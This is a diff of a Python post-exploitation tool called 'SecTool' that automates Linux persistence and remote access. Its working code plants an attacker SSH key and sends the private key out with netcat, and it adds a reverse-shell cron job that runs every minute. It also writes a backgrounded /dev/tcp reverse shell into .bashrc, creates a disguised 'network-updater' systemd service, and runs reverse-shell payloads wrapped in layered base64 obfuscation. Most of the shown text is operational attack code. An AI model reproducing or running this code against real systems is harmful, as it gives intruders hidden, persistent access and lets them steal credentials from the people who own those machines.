@@ -4,32 +4,32 @@ import subprocess
 import time
 import uuid
 import base64
-import getpass
 import argparse
 import json
-from datetime import datetime
 from typing import Tuple, Optional, List, Dict
-import pwd
-import grp
 import shutil
 import socket
 import string
 import random
 import re
-from pathlib import Path
 
 # --- Constants ---
 CLEANUP_COMMENT = "# Added by SecTool for persistence"
 DEFAULT_CONFIG = {
     "default_attacker_ip": "127.0.0.1",
     "default_port": 4444,
-    "payload_dir": "/tmp/.sectool_tmp", # Using a hidden directory for payloads
+    "payload_dir": "/tmp/.sectool_tmp",
     "ssh_key_dir": os.path.expanduser("~/.ssh"),
     "exfil_timeout": 120,
     "retry_count": 3,
     "retry_delay": 2,
     "obfuscate_payload": False,
 }
+
+# --- Global State ---
+config = {}
+is_root = False
+current_user = ""
 
 # --- Utility Functions ---
 def validate_ip(ip: str) -> bool:
@@ -47,6 +47,26 @@ def validate_port(port: int) -> bool:
 def sanitize_input(input_str: str) -> str:
     """Removes potentially harmful characters from a string."""
     return re.sub(r'[^\w\s@./-]', '', input_str).strip()
+
+def get_attacker_info() -> Optional[Tuple[str, int]]:
+    """
+    Gets and validates the attacker's IP and port from user input,
+    reducing code duplication across multiple functions.
+    """
+    attacker_ip = input(f"Enter ATTACKING MACHINE'S IP (default: {config.get('default_attacker_ip', '127.0.0.1')}): ").strip() or config.get('default_attacker_ip', '127.0.0.1')
+    if not validate_ip(attacker_ip):
+        print_error("Invalid Attacker IP.")
+        return None
+
+    port_str = input(f"Enter the PORT for the listener (default: {config.get('default_port', 4444)}): ").strip() or str(config.get('default_port', 4444))
+    try:
+        port = int(port_str)
+        if not validate_port(port):
+            raise ValueError("Port must be between 1 and 65535.")
+        return attacker_ip, port
+    except ValueError as e:
+        print_error(f"Invalid port number: {e}")
+        return None
 
 def run_command(command: str | List[str], shell: bool = False, check: bool = False,
                 capture_output: bool = True, timeout: int = 60,
@@ -116,10 +136,6 @@ def print_error(message: str):
     """Prints an error message."""
     print(f"[ERROR] {message}")
 
-def print_stealth_tip(message: str):
-    """Prints a stealth tip."""
-    print(f"[STEALTH TIP] {message}")
-
 # --- Configuration Management ---
 def load_config(config_path: str = "sectool_config.json") -> Dict:
     """Loads a JSON configuration file, falling back to defaults."""
@@ -133,17 +149,22 @@ def load_config(config_path: str = "sectool_config.json") -> Dict:
         except Exception as e:
             print_error(f"Error loading config: {e}")
     
-    # Ensure the payload directory exists with secure permissions
-    Path(config["payload_dir"]).mkdir(mode=0o700, exist_ok=True)
+    os.makedirs(config["payload_dir"], mode=0o700, exist_ok=True)
     return config
 
 # --- Payload and SSH Key Generator ---
 def obfuscate_payload(payload_content: str) -> str:
-    """Obfuscates a payload using base64 encoding and a bash wrapper."""
+    """
+    Obfuscates a payload using multiple layers (base64 -> reverse -> base64)
+    to make it less trivial to decode.
+    """
     encoded_payload = base64.b64encode(payload_content.encode()).decode()
+    reversed_payload = encoded_payload[::-1]
+    final_payload = base64.b64encode(reversed_payload.encode()).decode()
+
     return f"""#!/bin/bash
 # Obfuscated payload
-echo '{encoded_payload}' | base64 -d | /bin/bash
+echo '{final_payload}' | base64 -d | rev | base64 -d | /bin/bash
 """
 
 def create_payload_script(target_ip: Optional[str], port: int, payload_type: str = "bash_reverse") -> Optional[str]:
@@ -152,7 +173,6 @@ def create_payload_script(target_ip: Optional[str], port: int, payload_type: str
         print_error("Invalid port for payload creation.")
         return None
 
-    # Currently only supports bash reverse shell
     payload_templates = {
         "bash_reverse": f"""#!/bin/bash
 # Reverse shell payload
@@ -240,29 +260,19 @@ def linux_persistence_menu():
 def ssh_authorized_keys():
     """Generates an SSH key, adds it to a user's authorized_keys, and exfiltrates the private key."""
     print_section_header("SSH Authorized Keys Persistence & Exfiltration")
-    print_info("This technique generates an SSH key pair on this target machine, adds the public key to")
-    print_info("the specified user's authorized_keys, and then attempts to send the private key")
-    print_info("back to your attacking machine for easy re-entry.")
-    print_warning("Requires root privileges if modifying another user's ~/.ssh/ or if current user lacks write access.")
+    print_info("This technique generates a new SSH key pair, adds the public key to a user's")
+    print_info("authorized_keys, and sends the private key to your attacking machine.")
+    print_warning("Requires root privileges if modifying another user's ~/.ssh/.")
 
-    target_username = sanitize_input(input(f"Enter target username (user on THIS machine, default: {os.getlogin()}): ").strip() or os.getlogin())
+    target_username = sanitize_input(input(f"Enter target username (default: {current_user}): ").strip() or current_user)
     
-    attacker_listener_ip = input(f"Enter your ATTACKING MACHINE'S IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
-    if not validate_ip(attacker_listener_ip):
-        print_error("Invalid Attacker IP.")
+    attacker_info = get_attacker_info()
+    if not attacker_info:
         return
-
-    listener_port_str = input(f"Enter the PORT your ATTACKING MACHINE will listen on (default: {config['default_port']}): ").strip() or str(config['default_port'])
-    try:
-        listener_port = int(listener_port_str)
-        if not validate_port(listener_port):
-            raise ValueError("Port must be between 1 and 65535.")
-    except ValueError as e:
-        print_error(f"Invalid port number: {e}")
-        return
+    attacker_listener_ip, listener_port = attacker_info
 
     key_type = input("Enter SSH key type (rsa/ed25519, default: rsa): ").strip() or "rsa"
-    key_size = 2048 if key_type == "rsa" else 256 # Default for ed25519
+    key_size = 2048 if key_type == "rsa" else 256
 
     key_path, pub_key_path = generate_ssh_key(key_type, key_size)
     if not key_path or not pub_key_path:
@@ -273,51 +283,38 @@ def ssh_authorized_keys():
             pub_key_content = f.read().strip()
         
         try:
-            target_user_info = pwd.getpwnam(target_username)
-            target_user_home = target_user_info.pw_dir
-            target_user_uid = target_user_info.pw_uid
-            target_user_gid = target_user_info.pw_gid
-        except KeyError:
-            print_error(f"User '{target_username}' not found on this system.")
+            home_dir_stdout, _, returncode = run_command(f"getent passwd {target_username} | cut -d: -f6", shell=True)
+            if returncode != 0 or not home_dir_stdout: raise KeyError
+            target_user_home = home_dir_stdout.strip()
+        except (KeyError, IndexError):
+            print_error(f"User '{target_username}' not found or home directory could not be retrieved.")
             shutil.rmtree(os.path.dirname(key_path))
             return
 
         ssh_dir = os.path.join(target_user_home, ".ssh")
         auth_keys_file = os.path.join(ssh_dir, "authorized_keys")
 
-        # Create and set permissions for .ssh directory if it doesn't exist
-        if not os.path.exists(ssh_dir):
-            print_info(f"Creating directory: {ssh_dir} for user {target_username}")
-            if os.geteuid() != 0 and target_username != os.getlogin():
-                print_warning(f"This requires sudo. You may be prompted for your sudo password.")
-                run_command(["sudo", "mkdir", "-p", ssh_dir])
-                run_command(["sudo", "chown", f"{target_username}:{target_username}", ssh_dir])
-                run_command(["sudo", "chmod", "700", ssh_dir])
-            else:
-                os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
-                os.chown(ssh_dir, target_user_uid, target_user_gid)
-
-        print_info(f"Adding public key to {auth_keys_file}...")
-        # Add key and set permissions for authorized_keys file
-        if os.geteuid() != 0 and target_username != os.getlogin():
+        if not is_root and target_username != current_user:
             print_warning(f"This requires sudo to write to {auth_keys_file}.")
+            run_command(["sudo", "mkdir", "-p", ssh_dir])
+            run_command(["sudo", "chmod", "700", ssh_dir])
             run_command(["sudo", "tee", "-a", auth_keys_file], input_data=f"\n{CLEANUP_COMMENT}\n{pub_key_content}\n")
-            run_command(["sudo", "chown", f"{target_username}:{target_username}", auth_keys_file])
             run_command(["sudo", "chmod", "600", auth_keys_file])
+            run_command(["sudo", "chown", f"{target_username}:{target_username}", ssh_dir])
+            run_command(["sudo", "chown", f"{target_username}:{target_username}", auth_keys_file])
         else:
-            with open(auth_keys_file, "a") as f:
-                f.write(f"\n{CLEANUP_COMMENT}\n{pub_key_content}\n")
-            os.chown(auth_keys_file, target_user_uid, target_user_gid)
-            os.chmod(auth_keys_file, 0o600)
+            run_command(["mkdir", "-p", ssh_dir])
+            run_command(["chmod", "700", ssh_dir])
+            run_command(["tee", "-a", auth_keys_file], input_data=f"\n{CLEANUP_COMMENT}\n{pub_key_content}\n")
+            run_command(["chmod", "600", auth_keys_file])
         
         print_success(f"Public key added to {auth_keys_file} for user '{target_username}'.")
 
-        # Exfiltration section
         print_section_header("Private Key Exfiltration")
         print_info(f"On your ATTACKING MACHINE, set up a listener to receive the private key:")
         print_info(f"  nc -lvnp {listener_port} > received_sectool_key.pem")
         
-        confirm_exfil = input(f"Press Enter when your listener is ready on {attacker_listener_ip}:{listener_port}... (or 'n' to skip exfil): ").lower()
+        confirm_exfil = input(f"Press Enter when your listener is ready... (or 'n' to skip exfil): ").lower()
         if confirm_exfil != 'n':
             print_info(f"Attempting to send private key '{os.path.basename(key_path)}' to {attacker_listener_ip}:{listener_port}...")
             stdout, stderr, returncode = run_command(
@@ -338,7 +335,6 @@ def ssh_authorized_keys():
     except Exception as e:
         print_error(f"An unexpected error occurred during SSH key persistence: {e}")
     finally:
-        # Cleanup temporary key files from the target
         if os.path.exists(os.path.dirname(key_path)):
             print_info(f"Cleaning up temporary SSH key files from {os.path.dirname(key_path)}...")
             shutil.rmtree(os.path.dirname(key_path))
@@ -372,33 +368,27 @@ def list_linux_cron_jobs():
         print(stdout or "No cron jobs found for current user.")
         print("----------------------------")
     else:
-        # A non-zero return code often just means no crontab file exists, which is not an error.
         print_info("No cron jobs found for current user.")
 
 def add_linux_cron_job_auto():
     """Adds a reverse shell cron job that runs every minute."""
     print_section_header("Add Cron Job (Reverse Shell)")
-    attacker_ip = input(f"Enter attacker IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
-    port_str = input(f"Enter port (default: {config['default_port']}): ").strip() or str(config['default_port'])
-    try:
-        port = int(port_str)
-        if not validate_port(port):
-            raise ValueError("Port must be between 1 and 65535.")
-    except ValueError as e:
-        print_error(f"Invalid port number: {e}")
+    
+    attacker_info = get_attacker_info()
+    if not attacker_info:
         return
+    attacker_ip, port = attacker_info
 
     payload_path = create_payload_script(attacker_ip, port, "bash_reverse")
     if not payload_path:
         return
     
-    interval = "* * * * *" # Every minute
+    interval = "* * * * *"
     command = f"/bin/bash {payload_path} >/dev/null 2>&1"
 
     try:
         stdout, stderr, returncode = run_command(["crontab", "-l"])
         current_crontab = stdout if returncode == 0 else ""
-        # Embed the cleanup comment in the same line as the command
         new_crontab = f"{current_crontab.strip()}\n{interval} {command} {CLEANUP_COMMENT}\n"
         
         stdout, stderr, returncode = run_command(["crontab", "-"], input_data=new_crontab)
@@ -414,42 +404,32 @@ def unix_shell_config_modification():
     """Adds a reverse shell command to a user's .bashrc file."""
     print_section_header("Unix Shell Configuration Modification (.bashrc)")
     print_info("This adds a reverse shell command to a user's ~/.bashrc file.")
-    print_info("The command will execute in the background when a new interactive bash shell is started.")
     print_warning("Requires write access to the target user's home directory. If targeting another user, requires root.")
 
-    target_username = sanitize_input(input(f"Enter target username (default: {os.getlogin()}): ").strip() or os.getlogin())
+    target_username = sanitize_input(input(f"Enter target username (default: {current_user}): ").strip() or current_user)
     
-    attacker_ip = input(f"Enter your ATTACKING MACHINE'S IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
-    if not validate_ip(attacker_ip):
-        print_error("Invalid Attacker IP.")
+    attacker_info = get_attacker_info()
+    if not attacker_info:
         return
-
-    listener_port_str = input(f"Enter the PORT your listener is on (default: {config['default_port']}): ").strip() or str(config['default_port'])
-    try:
-        listener_port = int(listener_port_str)
-        if not validate_port(listener_port):
-            raise ValueError("Port must be between 1 and 65535.")
-    except ValueError as e:
-        print_error(f"Invalid port number: {e}")
-        return
+    attacker_ip, listener_port = attacker_info
 
     try:
-        target_user_home = pwd.getpwnam(target_username).pw_dir
-    except KeyError:
-        print_error(f"User '{target_username}' not found on this system.")
+        home_dir_stdout, _, returncode = run_command(f"getent passwd {target_username} | cut -d: -f6", shell=True)
+        if returncode != 0 or not home_dir_stdout: raise KeyError
+        target_user_home = home_dir_stdout.strip()
+    except (KeyError, IndexError):
+        print_error(f"User '{target_username}' not found or home directory could not be retrieved.")
         return
 
     bashrc_path = os.path.join(target_user_home, ".bashrc")
-    # This command runs in a subshell and in the background (&) so it doesn't hijack the user's terminal.
-    command_to_add = f"(bash -i >& /dev/tcp/{attacker_ip}/{listener_port} 0>&1 &) {CLEANUP_COMMENT}"
+    command_to_add = f"\n(bash -i >& /dev/tcp/{attacker_ip}/{listener_port} 0>&1 &) {CLEANUP_COMMENT}\n"
 
     try:
-        if os.geteuid() != 0 and target_username != os.getlogin():
+        if not is_root and target_username != current_user:
             print_warning(f"This requires sudo to modify {bashrc_path}. You may be prompted for your sudo password.")
-            run_command(["sudo", "tee", "-a", bashrc_path], input_data=f"\n{command_to_add}\n")
+            run_command(["sudo", "tee", "-a", bashrc_path], input_data=command_to_add)
         else:
-            with open(bashrc_path, "a") as f:
-                f.write(f"\n{command_to_add}\n")
+            run_command(["tee", "-a", bashrc_path], input_data=command_to_add)
         
         print_success(f"Added stealthy reverse shell command to {bashrc_path} for user '{target_username}'.")
         print_info(f"Start a listener on your ATTACKING MACHINE: nc -lvnp {listener_port}")
@@ -463,19 +443,10 @@ def systemd_service_persistence():
     print_info("This creates a systemd service that runs a reverse shell on boot.")
     print_warning("Requires root privileges. You will be prompted for your sudo password.")
 
-    attacker_ip = input(f"Enter your ATTACKING MACHINE'S IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
-    if not validate_ip(attacker_ip):
-        print_error("Invalid Attacker IP.")
+    attacker_info = get_attacker_info()
+    if not attacker_info:
         return
-
-    listener_port_str = input(f"Enter the PORT your listener is on (default: {config['default_port']}): ").strip() or str(config['default_port'])
-    try:
-        listener_port = int(listener_port_str)
-        if not validate_port(listener_port):
-            raise ValueError("Port must be between 1 and 65535.")
-    except ValueError as e:
-        print_error(f"Invalid port number: {e}")
-        return
+    attacker_ip, listener_port = attacker_info
 
     service_name = f"network-updater-{uuid.uuid4().hex[:4]}.service"
     service_file_path = f"/etc/systemd/system/{service_name}"
@@ -527,19 +498,10 @@ def establish_reverse_shell_direct():
     print_info("This will create and execute a temporary reverse shell payload.")
     print_warning("The payload script will be removed immediately after execution attempt.")
 
-    attacker_ip = input(f"Enter your ATTACKING MACHINE'S IP (default: {config['default_attacker_ip']}): ").strip() or config['default_attacker_ip']
-    if not validate_ip(attacker_ip):
-        print_error("Invalid Attacker IP.")
+    attacker_info = get_attacker_info()
+    if not attacker_info:
         return
-
-    listener_port_str = input(f"Enter the PORT your listener is on (default: {config['default_port']}): ").strip() or str(config['default_port'])
-    try:
-        listener_port = int(listener_port_str)
-        if not validate_port(listener_port):
-            raise ValueError("Port must be between 1 and 65535.")
-    except ValueError as e:
-        print_error(f"Invalid port number: {e}")
-        return
+    attacker_ip, listener_port = attacker_info
 
     payload_path = create_payload_script(attacker_ip, listener_port, "bash_reverse")
     if not payload_path:
@@ -552,16 +514,14 @@ def establish_reverse_shell_direct():
         print_warning("Reverse shell execution cancelled.")
     else:
         print_info(f"Attempting to execute reverse shell from {payload_path}...")
-        # Execute without waiting for it to finish, as it will hang
         try:
             subprocess.Popen([f"/bin/bash", payload_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             print_success("Reverse shell command executed (check your listener!).")
         except Exception as e:
             print_error(f"Failed to launch reverse shell process: {e}")
     
-    # Cleanup the payload script regardless of execution success
     try:
-        time.sleep(1) # Give it a moment to launch
+        time.sleep(1) 
         os.remove(payload_path)
         print_success(f"Cleaned up temporary payload: {payload_path}")
     except Exception as e:
@@ -601,7 +561,6 @@ def find_suid_sgid_binaries():
     """Finds SUID and SGID binaries on the system."""
     print_section_header("SUID/SGID Binary Enumeration")
     print_info("Searching for binaries that may be exploitable for privilege escalation.")
-    print_stealth_tip("This is a passive enumeration. The risk increases when attempting to exploit identified binaries.")
 
     suid_command = "find / -perm -4000 -type f 2>/dev/null"
     sgid_command = "find / -perm -2000 -type f 2>/dev/null"
@@ -646,7 +605,6 @@ def add_user_to_sudo_group_auto():
     """Adds the current user to a common sudo group."""
     print_section_header("Add Current User to Sudo Group")
     print_warning("Requires root privileges.")
-    current_user = os.getlogin()
     sudo_groups = ["sudo", "wheel", "admin"]
     target_group = next((g for g in sudo_groups if run_command(["getent", "group", g])[2] == 0), None)
     if not target_group:
@@ -740,20 +698,21 @@ def cleanup_menu():
 
 def revert_file_content(file_path: str, username: str):
     """Generic function to remove lines with CLEANUP_COMMENT from a file."""
-    if not os.path.exists(file_path):
+    if run_command(['test', '-f', file_path])[2] != 0:
         print_info(f"File '{file_path}' not found. Nothing to revert.")
         return
     try:
-        is_sudo_needed = os.geteuid() != 0 and username != os.getlogin()
+        is_sudo_needed = not is_root and username != current_user
         
+        read_cmd = ["cat", file_path]
         if is_sudo_needed:
-            print_warning(f"Reading {file_path} for user {username} may require sudo.")
-            stdout, _, returncode = run_command(["sudo", "cat", file_path])
-            if returncode != 0: return
-            lines = stdout.splitlines(keepends=True)
-        else:
-            with open(file_path, "r") as f:
-                lines = f.readlines()
+            read_cmd.insert(0, "sudo")
+
+        stdout, _, returncode = run_command(read_cmd)
+        if returncode != 0:
+            print_error(f"Could not read file: {file_path}")
+            return
+        lines = stdout.splitlines(keepends=True)
         
         original_line_count = len(lines)
         new_lines = [line for line in lines if CLEANUP_COMMENT not in line]
@@ -762,13 +721,11 @@ def revert_file_content(file_path: str, username: str):
             print_info(f"No tool-added entries found in {file_path}.")
             return
 
+        write_cmd = ["tee", file_path]
         if is_sudo_needed:
-            print_warning(f"Writing to {file_path} for user {username} may require sudo.")
-            run_command(["sudo", "tee", file_path], input_data="".join(new_lines), shell=False)
-        else:
-            with open(file_path, "w") as f:
-                f.writelines(new_lines)
+            write_cmd.insert(0, "sudo")
         
+        run_command(write_cmd, input_data="".join(new_lines), shell=False)
         print_success(f"Removed tool entries from {file_path}.")
     except Exception as e:
         print_error(f"Error reverting file {file_path}: {e}")
@@ -776,9 +733,11 @@ def revert_file_content(file_path: str, username: str):
 def revert_ssh_authorized_keys():
     """Removes the tool's SSH keys from a user's authorized_keys."""
     print_section_header("Reverting SSH Authorized Keys")
-    username = sanitize_input(input(f"Enter target username (default: {os.getlogin()}): ").strip() or os.getlogin())
+    username = sanitize_input(input(f"Enter target username (default: {current_user}): ").strip() or current_user)
     try:
-        target_user_home = pwd.getpwnam(username).pw_dir
+        home_dir_stdout, _, returncode = run_command(f"getent passwd {username} | cut -d: -f6", shell=True)
+        if returncode != 0 or not home_dir_stdout: raise KeyError
+        target_user_home = home_dir_stdout.strip()
         auth_keys_file = os.path.join(target_user_home, ".ssh", "authorized_keys")
         revert_file_content(auth_keys_file, username)
     except KeyError:
@@ -823,9 +782,8 @@ def revert_systemd_service():
         return
 
     try:
-        # Use a shell to expand the wildcard
-        find_cmd = f"sudo find /etc/systemd/system/ -name '{service_pattern}'"
-        stdout, stderr, returncode = run_command(find_cmd, shell=True)
+        find_cmd = ["sudo", "find", "/etc/systemd/system/", "-name", service_pattern]
+        stdout, stderr, returncode = run_command(find_cmd, shell=False)
 
         if returncode != 0 or not stdout:
             print_info(f"No services found matching pattern: {service_pattern}")
@@ -853,9 +811,11 @@ def revert_systemd_service():
 def revert_unix_shell_config_modification():
     """Removes the tool's entries from a user's .bashrc."""
     print_section_header("Reverting Unix Shell Configuration Modifications (.bashrc)")
-    username = sanitize_input(input(f"Enter target username (default: {os.getlogin()}): ").strip() or os.getlogin())
+    username = sanitize_input(input(f"Enter target username (default: {current_user}): ").strip() or current_user)
     try:
-        target_user_home = pwd.getpwnam(username).pw_dir
+        home_dir_stdout, _, returncode = run_command(f"getent passwd {username} | cut -d: -f6", shell=True)
+        if returncode != 0 or not home_dir_stdout: raise KeyError
+        target_user_home = home_dir_stdout.strip()
         bashrc_path = os.path.join(target_user_home, ".bashrc")
         revert_file_content(bashrc_path, username)
     except KeyError:
@@ -891,7 +851,7 @@ def remove_privileged_local_account():
 def cleanup_all_payloads():
     """Removes all temporary payloads and SSH keys created by the tool."""
     print_section_header("Cleanup All Payloads")
-    payload_dir = config["payload_dir"]
+    payload_dir = config.get("payload_dir")
     print_warning(f"This will attempt to remove the entire payload directory: {payload_dir}.")
     confirm = input("Are you sure you want to proceed? (y/N): ").lower()
     if confirm != 'y':
@@ -899,11 +859,10 @@ def cleanup_all_payloads():
         return
 
     try:
-        if not os.path.exists(payload_dir):
+        if run_command(['test', '-d', payload_dir])[2] != 0:
             print_info(f"Payload directory '{payload_dir}' not found. Nothing to clean.")
             return
 
-        # Use sudo to remove the directory and its contents, bypassing permission issues
         stdout, stderr, returncode = run_command(["sudo", "rm", "-rf", payload_dir])
         if returncode == 0:
             print_success(f"Successfully removed payload directory: {payload_dir}")
@@ -919,10 +878,22 @@ def main_menu():
     parser = argparse.ArgumentParser(description="SecTool - ATT&CK Automation Framework")
     parser.add_argument("--config", type=str, default="sectool_config.json", help="Path to configuration file")
     args = parser.parse_args()
-    global config
+    
+    global config, is_root, current_user
     config = load_config(args.config)
+    
+    # This check assumes the script is run on a Linux-like system
+    # It will likely fail on a standard Windows command prompt
+    uid_stdout, _, uid_retcode = run_command(['id', '-u'])
+    if uid_retcode == 0:
+        is_root = uid_stdout.strip() == '0'
+        current_user, _, _ = run_command(['whoami'])
+    else:
+        print_warning("Could not determine user and root status. Assuming non-root.")
+        is_root = False
+        current_user = "user"
 
-    # --- New Banner ---
+
     banner = r"""
  ____  _____ ____  ____ ___ ____ _____ _____ _   _  ____ _____ 
 |  _ \| ____|  _ \/ ___|_ _/ ___|_   _| ____| \ | |/ ___| ____|
@@ -930,13 +901,15 @@ def main_menu():
 |  __/| |___|  _ < ___) | | ___) || | | |___| |\  | |___| |___ 
 |_|   |_____|_| \_\____/___|____/ |_| |_____|_| \_|\____|_____|
 
-    -- ATT&CK Automation Inspired v1.0 --
+    -- ATT&CK Automation Inspired v1.2 (Platform Agnostic) --
 """
     os.system('clear' if os.name == 'posix' else 'cls')
     print(banner)
+    
+    if is_root:
+        print_warning("Running as root. Some operations will not prompt for sudo.")
+    
     input("Press Enter to start...")
-    # --- End Banner ---
-
 
     while True:
         os.system('clear' if os.name == 'posix' else 'cls')
@@ -961,11 +934,5 @@ def main_menu():
             input("\nPress Enter to continue...")
 
 if __name__ == "__main__":
-    if sys.platform != "linux":
-        print_error("This tool is designed for Linux systems only.")
-        sys.exit(1)
-    if os.geteuid() == 0:
-        print_warning("Running as root. Some operations will not prompt for sudo.")
-    
     main_menu()
 
